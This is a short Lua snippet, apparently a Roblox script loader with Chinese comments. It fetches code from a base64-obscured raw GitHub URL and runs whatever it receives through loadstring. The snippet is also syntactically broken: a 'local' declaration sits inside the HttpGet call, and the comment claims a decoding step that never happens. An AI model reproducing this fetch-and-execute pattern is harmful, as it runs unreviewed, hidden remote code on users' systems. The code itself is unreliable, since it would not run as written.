local success, code = pcall(function()
    return game:HttpGet(local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0d1bzYxLzEyMy9yZWZzL2hlYWRzL21haW4v5paw5oql5pWw5oql5omL5aSn5Lu2Lmx1YQ==")  -- 通过解码后的URL获取代码
end)

if success and code then
    local execSuccess = pcall(function()
        loadstring(code)()  
    end)
    if not execSuccess then
        warn("脚本执行失败，可能是代码有误")
    end
end
